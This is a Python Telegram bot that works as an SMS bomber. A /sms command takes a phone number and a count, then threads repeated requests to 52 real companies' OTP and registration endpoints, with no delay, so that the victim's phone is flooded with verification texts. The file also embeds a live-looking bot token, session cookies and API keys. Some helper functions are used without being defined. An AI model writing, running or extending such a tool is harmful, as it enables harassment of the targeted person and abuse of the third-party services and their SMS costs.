from telegram.ext import Updater, CommandHandler
import requests
import threading

# Define all 52 API functions
def ab1(phone):
    requests.post("https://api.myfave.com/api/fave/v3/auth", headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": "Mozilla/5.0"}, json={"phone": f"{phone}"})

def ab2(phone):
    requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": "Mozilla/5.0"}, json={"reqId": "39816-1633012470", "params": {"phone": f"{phone[1:]}", "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}})

def ab3(phone):
    requests.post("https://www.fox888.com/api/otp/register", data=f"applicant={phone}&serviceName=FOX888", headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})

def ab4(phone):
    requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", headers={"User-Agent": "Mozilla/5.0"}, data={"phone": phone, "password": "123456789Az"})

def ab5(phone):
    requests.post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": "Mozilla/5.0"}, data={'phonenumber': phone, 'language': "th"})

def ab6(phone):
    requests.post("https://gccircularlivingshop.com/sms/sendOtp", headers={"User-Agent": "Mozilla/5.0"}, json={"grant_type": "otp", "username": f"{phone[1:]}", "password": "", "client": "ecommerce"})

def ab7(phone):
    requests.post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": "Mozilla/5.0"}, data={"phone": phone})

def ab8(phone):
    requests.post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": "Mozilla/5.0"}, data={"number": f"{phone[1:]}"})


def ab9(phone):
    requests.post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": "Mozilla/5.0"}, json={"Phone": phone})

def ab10(phone):
    requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": "Mozilla/5.0"}, data={"phone": phone})

def ab11(phone):
    requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": "Mozilla/5.0"}, data={"phone": phone})

def ab12(phone):
    requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": "Mozilla/5.0"}, json={"client_id": "4ddf78ade8324462988fec5bfc5874c2", "transaction_ctx": "null", "country_code": "TH", "method": "SMS", "num_digits": "6", "scope": "openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile", "phone_number": f"{phone[1:]}"})


def ab13(phone):
    requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json;charset=UTF-8"}, json={"phone_no": phone})

def ab14(phone):
    session = requests.Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": "Mozilla/5.0", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})

def ab15(phone):
    requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": "Mozilla/5.0"}, data={"tel": phone, "otp_type": "register"})

def ab16(phone):
    requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": "Mozilla/5.0"}, json={"on": {"value": phone, "country": "66"}, "type": "mobile"})

def ab17(phone):
    requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": "Mozilla/5.0"})

def ab18(phone):
    requests.post("https://graph.firster.com/graphql", headers={"User-Agent": "Mozilla/5.0", "organizationcode": "lifestyle", "content-type": "application/json"}, json={"operationName": "sendOtp", "variables": {"input": {"mobileNumber": phone[1:], "phoneCode": "THA-66"}}, "query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})

def ab19(phone):
    requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": "Mozilla/5.0"}, json={"lang": "th", "userType": "BUYER", "locale": "th", "orgIdfier": "scg", "phone": f"{phone[1:]}", "type": "signup", "otpTemplate": "buyer_signup_otp_message", "userParams": {"buyerName": randomString(10)}})

def ab20(phone):
    requests.post("https://store.boots.co.th/api/v1/guest/register/otp", headers={"User-Agent": "Mozilla/5.0"}, json={"phone_number": f"{phone[1:]}"})

def ab21(phone):
    requests.post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": "Mozilla/5.0"}, json={"brands_id": "609caede5a67e5001164b89d", "agent_register": "60a22f7d233d2900110070d7", "tel": phone})

def ab22(phone):
    session = requests.Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0"}).text
    session.post("https://srfng.ais.co.th/api/v2/login/sendOneTimePW", data=f"msisdn={phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms", headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})

def ab23(phone):
    requests.post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber": f"{phone}"})

def ab24(phone):
    session = requests.Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0"}).text
    session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms", headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})

def ab25(phone):
    requests.post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber": f"{phone}", "language": "th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab26(phone):
    requests.post("https://unacademy.com/api/v3/user/user_check/", json={"phone": f"{phone}", "country_code": "TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab27(phone):
    requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json", headers={"content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36", "cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})

def ab28(phone):
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"{phone}", "password": "6302814184624az", "name": "0903281894", "provinceCode": "28", "districtCode": "393", "subdistrictCode": "3494", "zipcode": "40260", "siebelCustomerTypeId": "710", "acceptTermAndCondition": "true", "hasSeenConsent": "false", "locale": "th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab29(phone):
    requests.post("https://www.homepro.co.th/service/user/profile/otp.jsp", data=f"action=otp&user_mobile_number={phone}", headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "x-csrf-token": "AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "cookie": "h11e_uuid=5da6d569-5a72-4014-afef-40990862f26e; ltcid=4ac7dc78-ae73-4617-ba28-75b31ed3bc9f; ltsid=9b139725-fc38fbcc; _gid=GA1.3.1373861600.1635677257; _fbp=fb.2.1635677258036.1072722582; h11e_data1=ZTE1MWFkY2ZjMDk3ODk1MzhiMzk1MzM0OTc5NDMzMmIzOWEyOGVhNWU3NWU1NzQzODJhODMyM2U1MWI3MGQ0Yzg1MWM4MGEzYjJmMjUwYTUxMThjZGU2YTQ3NzVkNDMy; h11e_lang=th; _dc_gtm_UA-112826849-3=1; h11e_user=N2NlM2E4ODNkYjQxNjcwNTg3YzgxN2UwZWJiMDFkNmU0ZWUzM2M0M2U2YTJmNTkxMzA2NjYxYzU2MTFiNjFjNw==; h11e_csrf=AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB; JSESSIONID=06E6906132FE92B731D49BFD2F00877D; _ga=GA1.3.106485705.1635677257; _ga_RMXSTMQMK7=GS1.1.1635677253.1.1.1635677348.0"})

def ab30(phone):
    requests.post("https://www.vegas77slots.com/auth/send_otp", data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076", headers={"content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36", "cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"})

def ab31(phone):
    requests.post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab32(phone):
    requests.post("https://1ufabet.com/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab33(phone):
    requests.post(f"https://findclone.ru/register?phone={phone}")

def ab34(phone):
    requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile": f"{phone}"})

def ab35(phone):
    requests.post("https://api.dgashopqr.morchana.in.th/logins", headers={"User-Agent": "Mozilla/5.0"}, data={"phone": phone})

def ab36(phone):
    requests.post("https://taxi.yandex.kz/3.0/launch/", data={'phone': f"{phone}"})

def ab37(phone):
    requests.post("https://api.baccaratth.com/api/v1/sendotp", data={'phone_number': f"{phone}"})

def ab38(phone):
    send = requests.Session()
    send.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    })
    send.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data=f"st.r.phone=+66{phone[1:]}")
    send.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI", data="st.r.fieldAcceptCallUIButton=Call")

def ab39(phone):
    requests.post(f"https://www.konglor888.com/api/otp/register", data=f'applicant={phone}&serviceName=KONGLOR888', headers={'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest', 'accept-language': 'en-US,en;q=0.9', 'x-frame-options': 'SAMEORIGIN', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41', 'accept-encoding': 'gzip, deflate, br', 'accept': '*/*'})

def ab40(phone):
    requests.post(f"https://api.ufaz88regis.com/api/getOtp", data=f'phone={phone}&aff_link=1%24abWbahhDXS1', headers={'accept': '*/*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'sec-ch-ua-mobile': '?0', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.67'})

def ab41(phone):
    requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={'number': f"{phone}"})

def ab42(phone):
    requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data={'cellphone': f"{phone}"})

def ab43(phone):
    requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", data={'phone': f"{phone}"})

def ab44(phone):
    requests.post("https://discord.com/api/v9/auth/register/phone", headers={"Host": "discord.com", "user-agent": "Discord-Android/105013"}, json={"phone": "+66" + phone})

def ab45(phone):
    requests.post("https://www.theconcert.com/rest/request-otp", json={"mobile": phone, "country_code": "TH", "lang": "th", "channel": "call", "digit": 4}, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})

def ab46(phone):
    requests.post("https://topping.truemoveh.com/api/get_request_otp", headers={"Host": "topping.truemoveh.com", "Accept": "application/json, text/plain, */*"}, data={"mobile_number": phone})

def ab47(phone):
    requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn", headers={"content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}, data=f"phoneno={phone}&retrycount=0")

def ab48(phone):
    requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={'username': f"{phone}"})

def ab49(phone):
    requests.post("https://www.msport1688.com/auth/send_otp", data={'phone': f"{phone}"})

def ab50(phone):
    requests.post("https://ipro356.com/wp-content/themes/hello-elementor/modules/index.php", data=f"method=wpRegisterotp&otp_tel={phone}", headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})

def ab51(phone):
    requests.post("https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10)"}, data={"phone": phone})

def ab52(phone):
    requests.post("https://example.com/api/otp", headers={"User-Agent": "Mozilla/5.0"}, data={"phone": phone})

# Function to send SMS via all APIs
def start_all(phone, amount):
    for _ in range(amount):
        threading.Thread(target=ab1, args=(phone,)).start()
        threading.Thread(target=ab2, args=(phone,)).start()
        threading.Thread(target=ab3, args=(phone,)).start()
        threading.Thread(target=ab4, args=(phone,)).start()
        threading.Thread(target=ab5, args=(phone,)).start()
        threading.Thread(target=ab6, args=(phone,)).start()
        threading.Thread(target=ab7, args=(phone,)).start()
        threading.Thread(target=ab8, args=(phone,)).start()
        threading.Thread(target=ab9, args=(phone,)).start()
        threading.Thread(target=ab10, args=(phone,)).start()
        threading.Thread(target=ab11, args=(phone,)).start()
        threading.Thread(target=ab12, args=(phone,)).start()
        threading.Thread(target=ab13, args=(phone,)).start()
        threading.Thread(target=ab14, args=(phone,)).start()
        threading.Thread(target=ab15, args=(phone,)).start()
        threading.Thread(target=ab16, args=(phone,)).start()
        threading.Thread(target=ab17, args=(phone,)).start()
        threading.Thread(target=ab18, args=(phone,)).start()
        threading.Thread(target=ab19, args=(phone,)).start()
        threading.Thread(target=ab20, args=(phone,)).start()
        threading.Thread(target=ab21, args=(phone,)).start()
        threading.Thread(target=ab22, args=(phone,)).start()
        threading.Thread(target=ab23, args=(phone,)).start()
        threading.Thread(target=ab24, args=(phone,)).start()
        threading.Thread(target=ab25, args=(phone,)).start()
        threading.Thread(target=ab26, args=(phone,)).start()
        threading.Thread(target=ab27, args=(phone,)).start()
        threading.Thread(target=ab28, args=(phone,)).start()
        threading.Thread(target=ab29, args=(phone,)).start()
        threading.Thread(target=ab30, args=(phone,)).start()
        threading.Thread(target=ab31, args=(phone,)).start()
        threading.Thread(target=ab32, args=(phone,)).start()
        threading.Thread(target=ab33, args=(phone,)).start()
        threading.Thread(target=ab34, args=(phone,)).start()
        threading.Thread(target=ab35, args=(phone,)).start()
        threading.Thread(target=ab36, args=(phone,)).start()
        threading.Thread(target=ab37, args=(phone,)).start()
        threading.Thread(target=ab38, args=(phone,)).start()
        threading.Thread(target=ab39, args=(phone,)).start()
        threading.Thread(target=ab40, args=(phone,)).start()
        threading.Thread(target=ab41, args=(phone,)).start()
        threading.Thread(target=ab42, args=(phone,)).start()
        threading.Thread(target=ab43, args=(phone,)).start()
        threading.Thread(target=ab44, args=(phone,)).start()
        threading.Thread(target=ab45, args=(phone,)).start()
        threading.Thread(target=ab46, args=(phone,)).start()
        threading.Thread(target=ab47, args=(phone,)).start()
        threading.Thread(target=ab48, args=(phone,)).start()
        threading.Thread(target=ab49, args=(phone,)).start()
        threading.Thread(target=ab50, args=(phone,)).start()
        threading.Thread(target=ab51, args=(phone,)).start()
        threading.Thread(target=ab52, args=(phone,)).start()

# Telegram bot command to handle /sms <phone> <amount>
def sms(update, context):
    try:
        phone = context.args[0]
        amount = int(context.args[1])
        
        # Run the API functions without delay or cooldown
        start_all(phone, amount)
        
        update.message.reply_text(f"Sending SMS to {phone} for {amount} rounds!")
    
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /sms <phone> <amount>")

# Set up the Telegram bot
def main():
    TOKEN = '7291952960:AAF0s9gBMN7pfmha7cRoBsVF1ekgwq_7wHY'
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    
    # Register /sms command
    dp.add_handler(CommandHandler("sms", sms))
    
    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
                                                                                                                                      
